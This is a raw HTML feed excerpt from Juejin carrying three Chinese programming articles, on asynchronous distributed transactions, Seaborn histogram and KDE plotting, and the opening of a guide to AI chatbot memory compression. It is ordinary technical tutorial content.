    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveComplexity</span>()</span> {
        <span class="hljs-comment">// 方案：使用成熟消息中间件</span>
        <span class="hljs-comment">// 方案：封装通用消息组件</span>
        <span class="hljs-comment">// 方案：完善的监控告警</span>
    }
}
</code></pre>
<h2 data-id="heading-8">九、面试深度问答</h2>
<p><strong>Q1：异步确保型事务如何保证消息不丢失？</strong> <strong>A：</strong> 通过本地消息表在业务事务中同步保存消息，再通过定时任务异步发送，确保业务操作和消息存储的原子性。</p>
<p><strong>Q2：如何解决消息重复消费问题？</strong> <strong>A：</strong> 在消费者端实现幂等性处理，通过唯一业务ID、版本号或消费记录表来避免重复处理。</p>
<p><strong>Q3：异步确保型事务适用于哪些场景？</strong> <strong>A：</strong> 适用于高并发、对实时一致性要求不高、可以接受最终一致性的业务场景，如电商下单、日志处理、数据同步等。</p>
<p><strong>Q4：与TCC事务相比有什么优势？</strong> <strong>A：</strong> 性能更高、业务侵入性更低、实现相对简单，但一致性保证较弱，需要处理消息可靠性问题。</p>
<p><strong>Q5：如何监控和保障异步事务的健康度？</strong> <strong>A：</strong> 需要监控消息积压情况、处理延迟、失败率等指标，设置合理的告警阈值，并建立人工干预机制。</p>
<p><strong>面试技巧</strong>：</p>
<ol>
<li>从同步阻塞的问题引出异步方案的必要性</li>
<li>重点讲解本地消息表模式的核心原理</li>
<li>强调幂等性和可靠性的重要性</li>
<li>结合实际业务场景说明适用性</li>
<li>展示对优缺点和注意事项的全面理解</li>
</ol>
<p><strong>本文由微信公众号"程序员小胖"整理发布，转载请注明出处。</strong>**</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【数据操作与可视化】Serborn绘图-单变量分布]]></title>    <link>https://juejin.cn/post/7579889969985716275</link>    <guid>https://juejin.cn/post/7579889969985716275</guid>    <pubDate>2025-12-05T01:37:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579889969985716275" data-draft-id="7579889969985683507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【数据操作与可视化】Serborn绘图-单变量分布"/> <meta itemprop="keywords" content="Python,数据可视化"/> <meta itemprop="datePublished" content="2025-12-05T01:37:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI小云"/> <meta itemprop="url" content="https://juejin.cn/user/4153318871926912"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【数据操作与可视化】Serborn绘图-单变量分布
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4153318871926912/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI小云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T01:37:38.000Z" title="Fri Dec 05 2025 01:37:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【数据操作与可视化】Serborn绘图-单变量分布</h2>
<h5 data-id="heading-1">一、简单入门</h5>
<p>Matplotlib虽然已经是比较优秀的绘图库了，但是它有个今人头疼的问题，那就是API使用过于复杂，它里面有上千个函数和参数，属于典型的那种可以用它做任何事，却无从下手。</p>
<p>Seaborn基于 Matplotlib核心库进行了更高级的API封装，可以轻松地画出更漂亮的图形，而Seaborn的漂亮主要体现在配色更加舒服，以及图形元素的样式更加细腻。</p>
<p>使用前安装和导入：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 安装 </span>
pip3 install seaborn
<span class="hljs-comment"># 导入</span>
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns
<span class="hljs-comment"># 画一张图</span>
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
sns.lineplot(x=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],y=[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>])
plt.show()
​
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adce5c33e5b44140ae077d6c26a6b7cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlsI_kupE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765503458&amp;x-signature=jZY6SZjk7A2aMoMigGOCRbSxbjc%3D" alt="1.png" loading="lazy"/></p>
<h4 data-id="heading-2">二、绘制单变量分布</h4>
<p>可以采用最简单的直方图描述单变量的分布情况。 Seaborn中提供了 distplot()函数，它默认绘制的是一个带有核密度估计曲线的直方图。 distplot()函数的语法格式如下。</p>
<pre><code class="hljs language-python" lang="python">seaborn.distplot(a, bins=<span class="hljs-literal">None</span>, hist=<span class="hljs-literal">True</span>, kde=<span class="hljs-literal">True</span>, rug=<span class="hljs-literal">False</span>, fit=<span class="hljs-literal">None</span>, color=<span class="hljs-literal">None</span>)
</code></pre>
<p>上述函数中常用参数的含义如下：</p>
<ul>
<li>(1) a：表示要观察的数据，可以是 Series、一维数组或列表。</li>
<li>(2) bins：用于控制条形的数量。</li>
<li>(3) hist：接收布尔类型，表示是否绘制(标注)直方图。</li>
<li>(4) kde：接收布尔类型，表示是否绘制高斯核密度估计曲线。</li>
<li>(5) rug：接收布尔类型，表示是否在支持的轴方向上绘制rugplot。</li>
</ul>
<p>通过 distplot())函数绘制直方图的示例如下。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
sns.<span class="hljs-built_in">set</span>()
np.random.seed(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 确定随机数生成器的种子,如果不使用每次生成图形不一样</span>
arr = np.random.randn(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 生成随机数组</span>
sns.distplot(arr, bins=<span class="hljs-number">10</span>, hist=<span class="hljs-literal">True</span>, kde=<span class="hljs-literal">True</span>, rug=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 绘制直方图</span>
plt.show()
</code></pre>
<p>上述示例中，首先导入了用于生成数组的numpy库，然后使用 seaborn调用set()函数获取默认绘图，并且调用 random模块的seed函数确定随机数生成器的种子，保证每次产生的随机数是一样的，接着调用 randn()函数生成包含100个随机数的数组，最后调用 distplot()函数绘制直方图。</p>
<p>运行结果如下图所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09c6c8e59bca49359c5ac1c642b3cc08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlsI_kupE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765503458&amp;x-signature=NCeHjyjLJ%2BopkYNoC5gp1Ddddr4%3D" alt="2.jpg" loading="lazy"/></p>
<p>从上图中看出：</p>
<ul>
<li>直方图共有10个条柱，每个条柱的颜色为蓝色，并且有核密度估计曲线。</li>
<li>根据条柱的高度可知，位于-1-1区间的随机数值偏多，小于-2的随机数值偏少。</li>
</ul>
<p>通常，采用直方图可以比较直观地展现样本数据的分布情况，不过，直方图存在一些问题，它会因为条柱数量的不同导致直方图的效果有很大的差异。为了解决这个问题，可以绘制核密度估计曲线进行展现。</p>
<ul>
<li><strong>核密度估计</strong>是在概率论中用来估计未知的密度函数，属于非参数检验方法之一，可以比较直观地看出数据样本本身的分布特征。</li>
</ul>
<p>通过 distplot()函数绘制核密度估计曲线的示例如下。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建包含500个位于[0，100]之间整数的随机数组</span>
<span class="hljs-attr">array_random</span> = np.random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">500</span>)
<span class="hljs-comment"># 绘制核密度估计曲线</span>
sns.distplot(array_random, <span class="hljs-attr">hist</span>=<span class="hljs-literal">False</span>, rug=<span class="hljs-literal">True</span>)
plt.show()
</code></pre>
<p>上述示例中，首先通过 random.randint()函数返回一个最小值不低于0、最大值低于100的500个随机整数数组然后调用 displot()函数绘制核密度估计曲线。</p>
<p>运行结果如图所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3912ec58ffe54a8a97b6476f6b45809d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlsI_kupE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765503458&amp;x-signature=tezLr1LuBH%2FlDpsUTPQvS%2FxgYdk%3D" alt="3.jpg" loading="lazy"/></p>
<p>从上图中看出，图表中有一条核密度估计曲线，并且在x轴的上方生成了观测数值的小细条。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Chatbot记忆系统实战：压缩策略与性能优化（上）]]></title>    <link>https://juejin.cn/post/7579961957194530866</link>    <guid>https://juejin.cn/post/7579961957194530866</guid>    <pubDate>2025-12-04T16:44:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579961957194530866" data-draft-id="7579832186880835634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Chatbot记忆系统实战：压缩策略与性能优化（上）"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2025-12-04T16:44:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AgentBuilder"/> <meta itemprop="url" content="https://juejin.cn/user/1567285004234219"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Chatbot记忆系统实战：压缩策略与性能优化（上）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1567285004234219/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AgentBuilder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:44:34.000Z" title="Thu Dec 04 2025 16:44:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1小时+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0"><strong>一、背景：为什么需要记忆系统？</strong></h2>
<p>开发AI Chatbot时，你是否遇到过这些问题：</p>
<ul>
<li>LLM记不住之前的对话，用户体验很差</li>
<li>对话轮数一多，Token成本直线上升</li>
<li>想做长期对话功能，但不知道如何管理上下文</li>
</ul>
<p>这些都是<strong>记忆管理</strong>的问题。本文将从零开始，带你实现一个完整的记忆系统。</p>
<h3 data-id="heading-1"><strong>1.1 问题1：上下文窗口的硬性限制</strong></h3>
<p>先看一组数据：</p>

























<table><thead><tr><th>模型</th><th>上下文窗口</th><th>能支持的对话轮数</th></tr></thead><tbody><tr><td>GPT-3.5</td><td>4K tokens</td><td>~10轮</td></tr><tr><td>GPT-4</td><td>8K tokens</td><td>~20轮</td></tr><tr><td>GPT-4 Turbo</td><td>128K tokens</td><td>~300轮</td></tr></tbody></table>
<p>看起来很多？但实际计算一下：</p>
<pre><code class="hljs">一轮对话（用户问 + AI答）≈ 400 tokens
20轮对话 = 8,000 tokens

GPT-4 的 8K 窗口 = 刚好20轮，就满了
</code></pre>
<p><strong>会发生什么？</strong></p>
<p>当上下文满了之后，LLM会：</p>
<ol>
<li>丢弃最早的对话</li>
<li>忘记用户之前说过的话</li>
<li>对话失去连贯性</li>
</ol>

<pre><code class="hljs language-python" lang="python">用户：<span class="hljs-string">"我叫Tom"</span>（第<span class="hljs-number">1</span>轮）
<span class="hljs-meta">... </span>对话了<span class="hljs-number">20</span>轮 ...
用户：<span class="hljs-string">"我叫什么名字？"</span>（第<span class="hljs-number">21</span>轮）
AI：<span class="hljs-string">"抱歉，我不记得"</span> ❌
</code></pre>
<p>即使用更大窗口的模型，也只是延缓问题，无法根本解决。</p>
<h3 data-id="heading-2"><strong>1.2 问题2：Token成本持续增长</strong></h3>
<p>Token不仅有数量限制，还有<strong>成本问题</strong>。</p>
<p>以DeepSeek为例（$0.14/1M tokens），算一笔账：</p>
<pre><code class="hljs language-ini" lang="ini">场景：客服机器人，日活10万用户

每次对话：
- 历史对话50轮 = 20,000 tokens
- 新用户输入 = 200 tokens
- 总计 = 20,200 tokens

成本计算：
- 单次对话成本 = 20,200 * $0.14 / <span class="hljs-attr">1M</span> = <span class="hljs-variable">$0</span>.<span class="hljs-number">003</span>
- 日成本 = 10万用户 * $<span class="hljs-attr">0.003</span> = <span class="hljs-variable">$300</span>
- 月成本 = $300 * <span class="hljs-attr">30</span> = <span class="hljs-variable">$9</span>,<span class="hljs-number">000</span>
</code></pre>
<p><strong>如果能压缩70%？</strong></p>
<pre><code class="hljs language-bash" lang="bash">压缩后每次 = 6,000 tokens
月成本 = <span class="hljs-variable">$2</span>,700
节省 = <span class="hljs-variable">$6</span>,300/月 = <span class="hljs-variable">$75</span>,600/年 ✅
</code></pre>
<p>这还只是输入成本，输出成本会更高！</p>
<h3 data-id="heading-3"><strong>1.3 问题3：用户期望的"记忆"能力</strong></h3>
<p>从产品角度看，用户期望AI能：</p>
<ul>
<li>记住自己的名字、偏好、背景</li>
<li>延续之前的对话话题</li>
<li>不用每次都重复信息</li>
</ul>
<p><strong>没有记忆 vs 有记忆：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">❌ 无记忆：
用户：<span class="hljs-string">"我昨天说过我喜欢吃辣的"</span>
AI：<span class="hljs-string">"抱歉，我不记得"</span>
用户：（关闭页面）

✅ 有记忆：
用户：<span class="hljs-string">"推荐个餐厅"</span>
AI：<span class="hljs-string">"Tom，根据你喜欢吃辣的口味，推荐你试试..."</span>
用户：（继续使用）
</code></pre>
<p>记忆能力是AI产品的核心竞争力。</p>
<h3 data-id="heading-4"><strong>1.4 解决方案：记忆系统</strong></h3>
<p>一个完整的记忆系统需要解决：</p>
<ol>
<li><strong>存什么</strong>：如何筛选和保存重要信息？</li>
<li><strong>怎么存</strong>：如何高效存储和检索？</li>
<li><strong>如何压缩</strong>：如何在有限窗口内保留最多信息？</li>
</ol>
<p>本文将实现一个完整的记忆系统，包括：</p>
<ul>
<li>✅ 短期记忆（内存，极速访问）</li>
<li>✅ 4种压缩策略（对比分析）</li>
<li>✅ 性能测试（真实数据）</li>
<li>✅ 中期记忆架构设计（Redis + PostgreSQL）</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc46b627b5444c9baea672b66336a386~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWdlbnRCdWlsZGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765471478&amp;x-signature=H7QCZBCq2at7ExBCwc3nM0be4%2FA%3D" alt="image.png" loading="lazy"/></p>
<p>完整代码已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot.git" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot.git" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<p>让我们开始吧。</p>
<p>完美！让我根据你的选择起草第二部分：</p>
<hr/>
<h2 data-id="heading-5"><strong>二、短期记忆实现</strong></h2>
<h3 data-id="heading-6"><strong>2.1 核心问题：如何存储最近N轮对话？</strong></h3>
<p>在实现记忆系统时，第一个要解决的问题是：<strong>如何高效地存储和管理最近的对话历史？</strong></p>
<p>需求很简单：</p>
<ul>
<li>保存最近10轮（20条消息）</li>
<li>超过限制后，自动删除最早的消息</li>
<li>读写速度要快（&lt;1ms）</li>
</ul>
<p>看起来很简单？让我们先看看常见的两种方案。</p>
<h3 data-id="heading-7"><strong>2.2 技术选型：List vs Deque</strong></h3>
<h4 data-id="heading-8"><strong>方案1：使用List</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithList</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages=<span class="hljs-number">20</span></span>):
        self.max_messages = max_messages
        self.messages = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role, content</span>):
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
        
        <span class="hljs-comment"># 手动删除最早的消息</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.messages) &gt; self.max_messages:
            self.messages = self.messages[-self.max_messages:]
</code></pre>
<p><strong>问题：</strong></p>
<ul>
<li>❌ 每次都要切片重新赋值（<code>messages[-20:]</code>）</li>
<li>❌ 切片操作会创建新列表，浪费内存</li>
<li>❌ 时间复杂度 O(n)</li>
</ul>
<h4 data-id="heading-9"><strong>方案2：使用Deque</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWithDeque</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_messages=<span class="hljs-number">20</span></span>):
        self.messages = deque(maxlen=max_messages)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_message</span>(<span class="hljs-params">self, role, content</span>):
        self.messages.append({<span class="hljs-string">"role"</span>: role, <span class="hljs-string">"content"</span>: content})
        <span class="hljs-comment"># 自动删除！无需手动管理</span>
</code></pre>
